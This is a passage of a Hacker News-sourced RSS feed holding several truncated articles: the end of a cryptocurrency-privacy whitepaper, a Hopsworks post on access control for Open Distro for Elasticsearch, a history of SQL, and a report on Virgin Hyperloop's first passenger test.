<p>Cryptocoins, although transactionally secure, offer no anonymity above and beyond existing methods available to all forms of money, such as obfuscation through legal entities, or bank mixing schemes, and indeed, they decrease privacy as every transaction is publicly recorded. One need only know some number of wallet locations and their benefactors in order to reveal a detailed picture of participants. </p>



<p><strong>Primary exposure points include:</strong></p>



<ul><li>Exchanging into crypto at market through an exchange.</li><li>Establishing ‚Äúmining‚Äù setups while paying for them with non-crypto currency.</li><li>Behavioral analysis, by tracking the flow of transactions and their timings to deduce whom has transacted.</li><li>Use of third party wallets.</li></ul>



<p>Truly, in any mode of exchange, some level of personal detail is exposed, and any transaction can only be undertaken if the benefits outweigh the risk of exposure. Many transactions indeed benefit from knowing the counter party to the transaction, such as when using bank cards and 3rd party payment processors to create safe and trustworthy shopping environments. </p>



<p>Although not anonymous, typical banking laws in OECD countries offer superior privacy to distributed ledger based crypto currencies. True anonymity for a widely adopted currency seems neither possible nor practical, and we instead take a view towards privacy in establishing the framework for Chances.</p>



<h2>Distributed ledgers</h2>



<p>Given that distributed ledgers do not protect privacy, we do not intend to implement them for CHANCES. We expect to use a cryptographically secure, private ledger than can be audited without disclosing user information.</p>



<h2>Why has nobody adopted crypto for transacting?</h2>



<p>Please see a break-out of this discussion. <a href="https://nealbozeman.com/crypto-adoption" data-type="post" data-id="368">Why cryptocoins have not been adopted by the marketplace</a></p>



<h2>Resources</h2>



<figure><p>
https://bitcoin.org/bitcoin.pdf
</p></figure>
<p><span></span>
				<span>Post Views: </span>
				<span>498</span>
			</p>	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://nealbozeman.com/chances-whitepaper</link>
            <guid isPermaLink="false">hacker-news-small-sites-25795697</guid>
            <pubDate>Fri, 15 Jan 2021 20:11:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Elasticsearch is dead, long live Open Distro for Elasticsearch]]>
            </title>
            <description>
<![CDATA[
Score 99 | Comments 58 (<a href="https://news.ycombinator.com/item?id=25794987">thread link</a>) | @nathaliaariza
<br/>
January 15, 2021 | https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR<strong>: </strong>The need for an open-source alternative to Elasticsearch has recently become more evident; platforms that bundle Open Distro for Elasticsearch are able to future-proof open-source support for free-text search and Elasticsearch. In this post, we describe how Hopsworks leverages the authentication and authorization support in Open Distro for Elasticsearch to make free text search a project-based multi-tenant service in Hopsworks. More concretely, Hopsworks now supports dynamic <a href="https://en.wikipedia.org/wiki/Role-based_access_control#:~:text=Role%2Dbased%20access%20control%20(RBAC)%20is%20a%20policy%2D,simple%20to%20perform%20user%20assignments.">role-based access control</a> (RBAC) to indexes in elasticsearch with no performance penalty by building on Open Distro for Elasticsearch (ODES).<br></p><p>In January 2021, <a href="https://anonymoushash.vmbrasseur.com/2021/01/14/elasticsearch-and-kibana-are-now-business-risks">Elastic switched from the Apache V2 open-source license</a> for both Elasticsearch and Kibana to a non open-source license to Server Side Public License (SSPL).</p><p>Hopsworks is an open-source platform that includes Open Distro for Elasticsearch (a fork of Elasticsearch) and Kibana.</p><p>In Hopsworks, we use Elasticsearch to provide free-text search for AI assets (features, models, experiments, datasets, etc). We also make Elasticsearch indexes available for use by programs run in Hopsworks. As we interpret it, the latter functionality means we contravene the licensing terms of the SSPL:</p><blockquote>‚ÄúIf you make the functionality of the Program or a modified version available to third parties as a service... (license conditions apply)‚Äù</blockquote><p>‚Äç</p><p>Luckily, we recently made the switch from Elasticsearch to <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a>, supported by AWS, which is Apache v2 licensed.<br></p><p>Open Distro for Elasticsearch supports Active Directory and LDAP for authentication and authorization. <a href="https://opendistro.github.io/for-elasticsearch-docs/old/0.9.0/docs/security/permissions/">Using the Security plugin</a>, you can use RBAC to control the actions a user can perform. A role defines the cluster operations and index operations a user can perform, including access to indices, and even fine-grained field and document level access. RBAC allows an administrator to define a single security policy and apply it to all members of a department. But individuals may be members of multiple departments, so a user might be given multiple roles. <a href="https://link.springer.com/chapter/10.1007/978-3-540-85776-1_17">With dynamic role-based access control</a> you can change the set of roles a user can hold at a given time. </p><p>For example, if a user is a member of two departments - one for accessing banking data and another one for accessing trading data, with dynamic RBAC, you could restrict the user to only allow her to hold one of those roles at a given time. The policy for deciding which role the user holds could, for example, depend on what VPN (virtual private network) the user is logged in to or what building the user is present in. In effect, dynamic roles would allow the user to hold only one of the roles at a time and sandbox her inside one of the domains - banking or trading. It would prevent her from cross-linking or copying data between the different trading and banking domains.</p><p>Hopsworks implements a dynamic role-based access control model through its project-based multi-tenant security model<strong>. </strong>&nbsp;Every Project has an <strong>owner</strong> with full read-write privileges and zero or more <strong>members</strong>.&nbsp; A project owner may invite other users to his/her project as either a <strong>Data Scientist </strong>(read-only privileges and run jobs privileges) or <strong>Data Owner</strong> (full privileges). Users can be members of (or own) multiple Projects, but inside each project, each member (user) has a unique identity - we call it a <em>project-user identity</em>.&nbsp; For example, user <em>Alice</em> in <em>Project A</em> is different from user <em>Alice </em>in <em>Project B - </em>(in fact, the system-wide (project-user) identities are <strong><em>ProjectA__Alice</em></strong> and <strong><em>ProjectB__Alice</em></strong>, respectively)<em>. </em></p><p><em>‚Äç</em>As such, each project-user identity is effectively a role with the project-level privileges to access data and run programs inside that project. If a user is a member of multiple projects, she has, in effect, multiple possible roles, but only one role can be active at a time when performing an action inside Hopsworks. When a user performs an action (for example, runs a program) it will be executed with the project-user identity. That is, the action will only have the privileges associated with that project. The figure below illustrates how Alice has a different identity for each of the two projects (A and B) that she is a member of. Each project contains its own separate private assets. Alice can use only one identity at a time which guarantees that she can‚Äôt access assets from both projects at the same time.</p><p>Hopsworks enables you to host sensitive data in a shared cluster using a <a href="https://www.logicalclocks.com/blog/how-we-secure-your-data-with-hopsworks">project-based access control security model</a> (an implementation of dynamic role-based access control). In Hopsworks, a project is a secure sandbox with members, data, code, and services. Similar to GitHub repositories, projects are self-service: users manage membership, roles, and can securely share data assets with other projects. This <em>project-based multi-tenant security model</em> enables users to host both sensitive and shared data in a single Hopsworks cluster - you do not need to manage and pay for separate clusters.&nbsp;<br></p><figure id="w-node-14452fea4591-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bafe67f9a01f3d5100b3_Screenshot%202021-01-15%20at%2016.54.57.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><p>An important aspect of project-based multi-tenancy is that assets can be shared between projects - sharing does not mean that data is duplicated. The current assets that can be shared between projects are: files/directories in HopsFS, Hive databases, feature stores, and Kafka topics. For example, in the figure below there are three users (User1, User2, and User3)&nbsp; and two projects (A and B). User1 is a member of project A, while User2 and User3 are members of project B. All three users (User1, User2, User3) can access the assets shared between project A and project B. As sharing does not mean copying, the access control rules for the asset are updated to give users in the other project read or write permissions on the shared asset.</p><p>‚Äç<br></p><figure id="w-node-213ef0acf495-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb182dbe7b79013d5093_Screenshot%202021-01-15%20at%2016.55.17.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><p>P<em>roject-user identity</em> is primarily based on a X.509 certificate issued internally by Hopsworks. Access control policies, however, are implemented by the platform services (HopsFS, Hive, Feature Store, Kafka), and for Elasticsearch Open Distro, permissions are managed using an open-source <a href="https://github.com/logicalclocks/elasticsearch-chef">Hopsworks project-based authorizer plugin</a>.</p><p>The following PySpark code snippet, <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-python.ipynb">available as a notebook</a> when you run the Spark Tour on Hopsworks, shows how to read from an index that is private to a project from PySpark. There is also an <a href="https://github.com/logicalclocks/hops-examples/blob/master/notebooks/spark/Elasticsearch-scala.ipynb">equivalent Scala/Spark notebook</a>.</p><p>
    -- CODE language-bash --
from hops import elasticsearch, hdfs 
df = spark.read.option("header","true").csv("hdfs:///Projects/" + hdfs.project_name() + "/Resources/akc_breed_info.csv")

# Write df to the project's private index called 'newindex'
df.write.format('org.elasticsearch.spark.sql').options(**elasticsearch.get_elasticsearch_config("newindex")).mode("Overwrite").save()

# Read from the project's private index called 'newindex'
reader = spark.read.format("org.elasticsearch.spark.sql").options(**elasticsearch.get_elasticsearch_config("newindex"))
df = reader.load().orderBy("breed")
df.show()
</p><figure id="w-node-44c6e7d98db1-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bb89f179d5ce9d7be772_Screenshot%202021-01-15%20at%2016.57.47.png" loading="lazy" alt=""></p></figure><p>‚Äç</p><p>In Hopsworks, we use Public Key Infrastructure (PKI) with X.509 certificates to authenticate and authorize users. Every user and every service in a Hopsworks cluster has a private key and an X.509 certificate. Hopsworks projects also support multi-tenant services that are not currently backed by X.509 certificates, including Elasticsearch. <a href="https://opendistro.github.io/for-elasticsearch/">Open Distro for Elasticsearch</a> supports authentication and access control using JSON Web Tokens (<a href="https://dzone.com/articles/what-is-jwt-token">JWT</a>).&nbsp; Similar to application X.509 certificates, Hopsworks‚Äô resource manager (HopsYARN) issues a JWT for each submitted job and propagates it to running containers. Using the JWT, user code can then securely make calls to Elasticsearch indexes owned by the project. The JWT is rotated automatically before it expires and invalidated by HopsYARN once the application has finished.<br></p><p>For every Hopsworks project, a number of private indexes can be created in Elasticsearch: an index for real-time logs of applications in that project (accessible via Kibana), an index for ML experiments in the project, and an index for provenance for the project‚Äôs applications and file operations. Elastic indexes are private to the project - they are not accessible by users that are not members of the project. This access control is implemented as follows: when a request is made on Elasticsearch using a JWT token, our authorizer plugin extracts the project-specific username from the JWT token, which is of the form:<strong><em>‚Äç</em></strong></p><p>‚Äç<strong><em>ProjectA__Alice</em></strong>&nbsp;</p><p>The index names have the following form:</p><p><strong><em>ProjectA__ElasticIndex</em></strong>&nbsp;</p><p>Our plugin checks if a project-specific user is allowed to read/write an index by checking that the prefix (<strong>ProjectA</strong>) of both the user and the index match one another. We plan to add support for sharing elasticsearch indexes between projects by storing a list of projects allowed to perform read and write operations, respectively, on the indexes belonging to a project.</p><h2>X.509 Service certificates</h2><p>In Hopsworks, services communicate with each other using their own certificate to authenticate and encrypt all traffic. Each service in Hopsworks, that supports TLS encryption and/or authentication, has its own service-specific X.509 certificate, including all services in the ELK Stack (Elasticsearch, Kibana, and Logstash). Service certificates contain the Fully Qualified Domain Name (FQDN) of the host they are installed on and the login name of the system user that the process runs as. They are generated when a user provisions Hopsworks, and they have a long lifespan. Service certificates can be rotated automatically in configurable intervals or upon request of the administrator.&nbsp;</p><h2>Securely accessing Elastic Indexes in Jobs on Kubernetes&nbsp;<br></h2><figure id="w-node-d2ae8e066750-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/6001bc186b327c00f6b51384_Screenshot%202021-01-15%20at%2016.59.47.png" loading="lazy" alt=""></p></figure><p>Hopsworks can be integrated with Kubernetes by configuring it to use one of the available authentication mechanisms: API tokens, credentials, certificates, and IAM roles for AWS‚Äô managed EKS offering. Hopsworks can run users‚Äô jobs on Kubernetes that have project-specific security material,&nbsp; X.509 certificates and JWTs, materialized to the launched Pods so user code can securely access services in Hopsworks, such as Open Distro for ‚Ä¶</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch">https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</a></em></p>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/elasticsearch-is-dead-long-live-open-distro-for-elasticsearch</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794987</guid>
            <pubDate>Fri, 15 Jan 2021 19:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What can we learn from SQL's ~50yr success story?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25794929">thread link</a>) | @nutmilk
<br/>
January 15, 2021 | https://blog.arctype.com/sql-50-years/ | <a href="https://web.archive.org/web/*/https://blog.arctype.com/sql-50-years/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <!--kg-card-begin: html--><!--kg-card-end: html--><p>In March 1971, Intel introduced the world's first general microprocessor, the <a href="https://spectrum.ieee.org/tech-history/silicon-revolution/chip-hall-of-fame-intel-4004-microprocessor">Intel 4004</a>. It had ~2,300 transistors and cost $60.</p><p>Fast forward almost 50 years, and the newest iPhone has nearly <strong>12 billion </strong>transistors (but unfortunately costs a little more than $60).</p><p>Many of the programming languages we use today were not introduced until the 90s (Java was introduced in 1996). However, there is one programming language that is still as popular today as it was when it was introduced nearly 50 years ago: <strong>SQL.</strong></p><p>This article will discuss the events that led to the introduction of relational databases, why SQL grew in popularity, and what we can learn from its success.</p><h2 id="table-of-contents">Table of Contents</h2><ol><li><a href="#history-of-early-database-management-ids-and-codasyl">A History of Early Database Management - IDS and CODASYL</a></li><li><a href="#the-network-data-model-better-than-todays-relational-model">The Network Data Model - Better Than Today's Relational Model? </a></li><li><a href="#arrival-of-the-relational-model">Arrival of The Relational Model</a></li><li><a href="#relational-vs-network-data-models">Relational vs. Network Data Models</a></li><li><a href="#the-rise-and-reign-of-sql">The Rise and Reign of SQL</a></li><li><a href="#the-secret-to-sqls-50-year-reign-and-what-we-can-learn">The Secret to SQL‚Äôs 50 Year Reign - And What We Can Learn</a></li></ol><!--kg-card-begin: html--><p>
    <h3>Looking for a collaborative SQL Editor?</h3>
    
</p><!--kg-card-end: html--><hr><h2 id="history-of-early-database-management-ids-and-codasyl">History of Early Database Management - IDS and CODASYL</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/image-3.png" alt="Charles Bachman - inventor of the the database management system"><figcaption><a href="https://www.slashdb.com/2015/10/09/flashback-friday-charles-bachman/">Image Source</a></figcaption></figure><p>In 1962, Charles W. Bachman (no relation to Erlich Bachman) was working as part of a small team at General Electric. One year later, Bachman‚Äôs team introduced what would later be recognized as the first database management system - the Integrated Data Store (IDS).</p><p>10 years later, Bachman would receive the coveted <a href="https://amturing.acm.org/">Turing Award</a>, often called the Nobel Prize of computer science, for his contributions to computing with IDS. </p><h3 id="what-was-ids">What was IDS?</h3><p>In the early 1960s, computer science was just beginning as an academic field. For context, ASCII was not introduced until 1963.</p><p>To understand IDS we have to first understand the two main forces that led to its development: </p><ol><li>The introduction of disk storage</li><li>A migration to high-level programming languages</li></ol><!--kg-card-begin: markdown--><h5 id="diskstorage">Disk storage</h5>
<!--kg-card-end: markdown--><figure><img src="https://blog.arctype.com/content/images/2021/01/image-1.png" alt="Workers moving a RAMAC 305"><figcaption>Above: <a href="https://calisphere.org/item/ark:/13030/kt80003844/">Moving a RAMAC 305</a></figcaption></figure><p>In 1956, IBM introduced the first commercial hard disk drive, the <a href="https://www.computerhistory.org/storageengine/first-commercial-hard-disk-drive-shipped/#:~:text=Informed%20by%20Jacob%20Rabinow's%20ideas,of%20Accounting%20and%20Control)%20system.">RAMAC 305</a>.</p><p>The introduction of disk drives allowed programmers to retrieve and update data by jumping directly to a location on the disk. This was a vast improvement from its predecessor, tape drives, which required moving sequentially through the tape to retrieve a specific piece of data. </p><p>But developers now had to figure out where records were stored on the disk. Due to the limitations of <a href="https://medium.com/@princeabhishek410/understanding-file-management-system-in-operating-system-4c7fbfc306f2">file management systems</a> in early operating systems, this was an advanced task reserved only for experienced programmers. </p><p>Developers needed a solution to simplify working with disk drives.</p><!--kg-card-begin: markdown--><h5 id="highlevelprogramming">High-level programming</h5>
<!--kg-card-end: markdown--><p>At the same time, computer science was beginning to move from innovators to early adopters on the <a href="https://en.wikipedia.org/wiki/Diffusion_of_innovations">adoption curve</a>. Low level programming languages like Assembly were popular among the early academics, but regular programmers were switching to higher level programming languages like COBOL for their usability.</p><p><a href="https://cacm.acm.org/magazines/2016/7/204036-how-charles-bachman-invented-the-dbms-a-foundation-of-our-digital-world/fulltext?mobile=false#body-3">So what was IDS?</a> IDS solved for disk storage and high-level programming. IDS allowed developers to use high-level programming languages, like COBOL, to build applications that input and retrieve data from disk storage. Because of this function, IDS has received the distinction as the first database management system.</p><h3 id="codasyl-a-new-standard-for-database-management">CODASYL - A new standard for database management</h3><p>In 1969, the Committee of Data Systems Languages (CODASYL) released a report proposing a standard for database management. Bachman was part of the committee, and the report drew heavily from IDS. </p><p>The CODASYL Data Model introduced many of the core features in database management systems that we use today:</p><ul><li>Schemas</li><li>Data definition language (DDL)</li><li>Data manipulation language (DML)</li></ul><p>Most importantly, IDS and CODASYL introduced a new way for modeling data that influenced the eventual development of SQL - the <strong>network data model</strong>.</p><h2 id="the-network-data-model-better-than-todays-relational-model">The Network Data Model - Better Than Todays Relational Model?</h2><figure><img src="https://lh5.googleusercontent.com/NxY7lsez_qxOIV5dLEXwJf-lbwhDo27cQ5JsEHUM0Tw-20M_nRfW_8rKPa571f9uwavlTFvRb0HoZGv13LFHEbRy7i_3atsXMzh1DlWUa0_1V6SZHdDeaN53nHMLhydHTc0yolyN" alt="Example of a Network Data Model"><figcaption>Above: Network model example</figcaption></figure><p>A data model is a standardized way to describe (model) the world (data). </p><p>The previous hierarchical data model used tree structures to describe data, but these were limited to one-to-many relationships. The new network model allow records to have multiple parents, which created a <strong>graph structure</strong>. By allowing multiple parents, network models were able to model many-to-one and many-to-many relationships. </p><p>In the network model, relationships between tables were stored in <em>sets</em>. Each set had an <em>owner</em> (i.e. teachers) and one or more <em>members</em> (i.e. classes and students).</p><p>One of the key benefits of the network model is that related records in a set were connected directly by pointers. Sets were implemented using next, prior, and owner pointers, which allowed for easy traversal similar to a linked list. </p><p>The low-level nature of network data models offered performance benefits, but they came at a cost. The network data model had increased storage costs because every record had to store extra pointers to its previous and parent record.</p><h2 id="arrival-of-the-relational-model">Arrival of The Relational Model</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/image-4.png" alt="Example of the relational data model - Tuples, Relations, and Attributes" srcset="https://blog.arctype.com/content/images/size/w600/2021/01/image-4.png 600w, https://blog.arctype.com/content/images/2021/01/image-4.png 751w" sizes="(min-width: 720px) 720px"><figcaption>Above: <a href="http://www.myrgpvdbms.com/2018/05/define-terms-domain-tuple-attribute-and.html">Example of a relational model</a></figcaption></figure><p>In 1970, 8 years afters IDS, Edgar F. Codd introduced the relational model in his seminal paper <a href="https://www.seas.upenn.edu/~zives/03f/cis550/codd.pdf">‚ÄúA Relational Model of Data for Large Shared Data Banks‚Äù</a> (also earning him a spot with Bachman as a Turing Award recipient).</p><p>Codd showed that all data in a database could be represented in terms of <em>tuples </em>(<em>rows</em> in SQL) grouped together into <em>relations </em>(<em>tables</em> in SQL). To describe the database queries, he invented a form of first-order predicate logic called <a href="https://www.geeksforgeeks.org/tuple-relational-calculus-trc-in-dbms/">tuple relational calculus</a>.</p><p>Tuple relational calculus introduced a <strong>declarative language</strong> for querying data. Declarative programming languages allow programmers to say <em>what </em>they want to do without describing <em>how </em>to do it.</p><p>This new declarative language was much easier to use for developers. The relational model laid out all the data in the open. Developers could retrieve all the data from a table, or read a single row, in one command. (thanks <a href="https://en.wikipedia.org/wiki/Query_optimization">query optimizer</a>)</p><p>Gone were the days of following a labyrinth of pointers to find your data. &nbsp;</p><h2 id="relational-vs-network-data-models">Relational vs Network Data Models</h2><p>Relational databases decreased the high storage costs that network databases had by <strong>normalizing data</strong>. Normalization was a process of decomposing tables to eliminate redundancy, and thereby decrease the footprint of data on disk.</p><p>However, relational databases had an increased CPU cost. In order to process normalized data, relational databases had to load tables in memory and use compute power to ‚Äújoin‚Äù tables back together. Let‚Äôs walk through the process for finding all classes and students for a given teacher with a relational model.</p><p>The database system would first perform an operation to retrieve all relevant classes. Then it would perform a second operation to retrieve student data. All of this data would be stored in memory, and it would run a third operation to merge the data before returning the result.</p><figure><img src="https://lh4.googleusercontent.com/8BGzrtrrXJig9p_y8RvzWdS36JEeCde97G5kyEKvwj70aeTiQTu7HkhiYmXJAYpJNykrWNVkI3NpQVaxpTZ2aNFZZSQwv7Nj2-QukpxKMm1pr8EivCMs0bb1dRrke3EBYITqAYIN" alt="Performance comparison between relational and network models"><figcaption>Performance comparison between relational and network models</figcaption></figure><p>In a performance case study using real data, <a href="https://raima.com/network-model-vs-relational-model/">Raima</a> found that network database models had 23x better insert performance and 123x faster query performance.</p><p>So why are relational databases the leading database solution?</p><p><strong>Usability</strong>.</p><p>The relational model was more flexible to changes, and its declarative syntax simplified the job for programmers. </p><p>And Moore‚Äôs law was working its magic in the background. The cost of computing continued to decrease, and eventually the increased computing cost of relational models was outweighed by the productivity gains. </p><p>Fast forward 50 years, and now the most expensive resource in a data center is the CPU. <a href="http://www.arctype.com/downloads">Sign up for Arctype</a> and get notified of a future post where I discuss what databases might look like over the next 50 years.</p><!--kg-card-begin: html--><p>
    <h3>The best SQL content in your inbox</h3>
    
</p><!--kg-card-end: html--><h2 id="the-rise-and-reign-of-sql">The Rise and Reign of SQL</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/arctype-brain-trust.png" alt="SQL meme" srcset="https://blog.arctype.com/content/images/size/w600/2021/01/arctype-brain-trust.png 600w, https://blog.arctype.com/content/images/2021/01/arctype-brain-trust.png 749w" sizes="(min-width: 720px) 720px"></figure><p>And finally, we've come to the arrival of the SQL that we all love. &nbsp;</p><p>4 years after the publication of Codd‚Äôs paper, Donald Chamberlin and Raymond Boyce published ‚Äú<a href="https://dl.acm.org/doi/10.1145/800296.811515">SEQUEL: A Structured English Query Language</a>‚Äù.</p><p>They described SEQUEL as ‚Äúa set of simple operations on tabular structures, [‚Ä¶] of equivalent power to the first order predicate calculus.‚Äù IBM saw the potential and moved quickly to develop the first version of SEQUEL as part of their System R project in the early 1970s.</p><p>The name would later change to SQL due to <a href="https://en.wikipedia.org/wiki/SQL">trademark issues</a> with the UK-based Hawker Siddeley aircraft company.</p><p>The next big step in SQL's adoption was almost a decade later. In 1986, the American National Standards Institute (ANSI) and the International Organization for Standardization (ISO) published the first official SQL standard: <strong>SQL-86</strong>. The standard broke down <a href="https://www.db-book.com/">SQL in several parts</a>:</p><ul><li><strong>Data Definition Language (DDL):</strong> commands to define and modify schemas and relations</li><li><strong>Data Manipulation Language (DML):</strong> commands to query, insert and delete information from a database</li><li><strong>Transaction Control:</strong> commands specifying the timing of transactions</li><li><strong>Integrity:</strong> commands to set constraints in the information in a database</li><li><strong>Views:</strong> commands to define Views</li><li><strong>Authorization:</strong> commands to specify user access</li><li><strong>Embedded SQL:</strong> commands that specify how to embed SQL in other languages</li></ul><h3 id="competitors-to-sql">Competitors to SQL</h3><p>Between 1974 to today there have been numerous competitors that have tried stealing market share from SQL‚Äôs dominance as a query language. These new syntaxes often catered to a specific, new technology:</p><ul><li>Lisp -&gt; <a href="https://www.quicklisp.org/beta/UNOFFICIAL/docs/clsql/doc/index.html">CLSQL</a></li><li>.NET -&gt; <a href="https://docs.microsoft.com/en-us/dotnet/csharp/linq/">LINQ</a></li><li>Ruby on Rails -&gt; <a href="https://guides.rubyonrails.org/active_record_querying.html">ActiveRecord</a></li></ul><p>Fast forward 35 years and SQL is still ubiquitous with databases. How has SQL maintained its reign as a query language, and what can we learn from its story?</p><h2 id="the-secret-to-sqls-50-year-reign-and-what-we-can-learn">The Secret to SQLs 50 Year Reign - And What We Can Learn</h2><figure><img src="https://blog.arctype.com/content/images/2021/01/stack.png" alt="SQL is a very popular programming language" srcset="https://blog.arctype.com/content/images/size/w600/2021/01/stack.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/01/stack.png 1000w, https://blog.arctype.com/content/images/2021/01/stack.png 1156w" sizes="(min-width: 720px) 720px"><figcaption>Above: <a href="https://insights.stackoverflow.com/survey/2017#technology">Stack Overflow Developer Survey, 2017</a></figcaption></figure><p>We started this story with Bachman‚Äôs introduction of the first database management system, IDS. We talked about how the shift to disk storage and high-level programming necessitated a new way of working with data. Then CODASYL came and standardized database management. IDS and CODASYL introduced the new network data model, and finally Codd dropped the relational model.</p><p>This happened over <em>eight years</em>.</p><p>How did SQL manage to stick around for the next 50 years? I think these are the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.arctype.com/sql-50-years/">https://blog.arctype.com/sql-50-years/</a></em></p>]]>
            </description>
            <link>https://blog.arctype.com/sql-50-years/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794929</guid>
            <pubDate>Fri, 15 Jan 2021 19:13:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Satran Satellite Tracking Antenna]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 18 (<a href="https://news.ycombinator.com/item?id=25794849">thread link</a>) | @zenbryo
<br/>
January 15, 2021 | https://www.danaco.se/satellite-tracker-antenna/ | <a href="https://web.archive.org/web/*/https://www.danaco.se/satellite-tracker-antenna/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.danaco.se/satellite-tracker-antenna/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25794849</guid>
            <pubDate>Fri, 15 Jan 2021 19:07:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Hyperloop Passenger Test Completed, What's Next?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25794813">thread link</a>) | @scottbucks
<br/>
January 15, 2021 | https://www.thedetechtor.com/post/first-hyperloop-passenger-test | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/first-hyperloop-passenger-test">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><p id="viewer-e5as9"><span>On November 8, 2020, Virgin Hyperloop completed the first-ever human passenger <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>Hyperloop</u></a> test. This is a huge step for the company trying to bring to life Tesla and SpaceX CEO Elon Musk's vision of a futuristic, ultra-fast and environmentally friendly <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>5th mode of transportation</u></a>. How are the results from this first passenger the test and what's next for the Hyperloop? </span></p><h2 id="viewer-44kam"><span>A Bit about the Hyperloop</span></h2><p id="viewer-1etse"><span>As mentioned in a <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>previous article</u></a> about the Hyperloop, it was originally conceived by Elon Musk in 2013 and has been touted as the fastest way to cross the surface of the Earth. Possibly one of the greatest leaps in transportation for generations, the concept promises to slash journey times between cities from several hours to a matter of minutes. Musk first mentioned that he was thinking about a concept for a "fifth mode of transport", calling it the Hyperloop, in July 2012 at a PandoDaily event in Santa Monica, California. He envisions the more advanced versions will be able to go at hypersonic speed.</span></p><blockquote id="viewer-4l8mu"><span>It's cross between a Concorde, a railgun, and an air hockey table - <strong>Elon Musk - CEO of Tesla and SpaceX </strong></span></blockquote><p id="viewer-bedt"><span>Since 2015, the yearly Hyperloop Pod Competition sponsored by SpaceX allowed student and non-student teams to participate, design and for some, build a subscale prototype transport vehicle in order to demonstrate the technical feasibility of various aspects of the Hyperloop concept.</span></p><h2 id="viewer-dkdqo"><span>An Important Milestone </span></h2><p id="viewer-8io9u"><span>The test took place on November 8, 2020, at the Virgin Hyperloop's DevLoop test track in the desert outside Las Vegas, Nevada. The first two passengers were Virgin Hyperloop‚Äôs chief technology officer and co-founder, Josh Giegel, and head of passenger experience, Sara Luchian. </span></p><p id="viewer-2jrma"><span>The test was completed with the newly-unveiled XP-2 vehicle, which was custom-built with occupant safety and comfort in mind. While the production vehicle will be larger and seat up to 28 passengers, this 2-seater XP-2 vehicle was built to demonstrate that passengers can in fact safely travel in a hyperloop vehicle.</span></p><p id="viewer-91v5a"><span>The pod accelerated up to 100 miles per hour (160 km/h) down the length of the 500 meters long track, before slowing down to a stop.</span></p><p id="viewer-b9ns9"><span>This is an incredible milestone for Virgin Hyperloop, one of the leaders in the race to build the first fully functional Hyperloop system, as it proves the safety of this futuristic mode of transport.</span></p><blockquote id="viewer-2ftb9"><span>"I can‚Äôt tell you how often I get asked ‚Äòis hyperloop safe?‚Äô, with today‚Äôs passenger testing, we have successfully answered this question" - <strong>Jay Walder, CEO of Virgin Hyperloop</strong></span></blockquote><h2 id="viewer-e8h4d"><span>What's Next?</span></h2><p id="viewer-4ab2"><span>This is not only a big step for Virgin Hyperloop, but it will also motivate other companies working on this technology, like <a href="https://www.hyperlooptt.com/" target="_blank" rel="noopener"><u>Hyperloop Transportation Technology</u></a> (HTT), <a href="https://www.transpod.com/" target="_blank" rel="noopener"><u>Transpod Inc</u></a>, or even <a href="https://tumhyperloop.de/" target="_blank" rel="noopener"><u>TUM Hyperloop</u></a>, a student team from the Technical University of Munich, to perform similar tests bring us closer to a faster, safer and greener future.</span></p><p id="viewer-do2ms"><span>All of these companies are working closely with governments and partners to help advance their technology and construction, in countries like India, the United States, Belgium, France and the United Arab Emirates.</span></p><p id="viewer-ccijs"><span>For more about the Hyperloop, <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>check out our article</u></a> covering <a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><u>everything you need</u></a> to know about this futuristic technology, from how it works, to who's building it, to what the potential cost 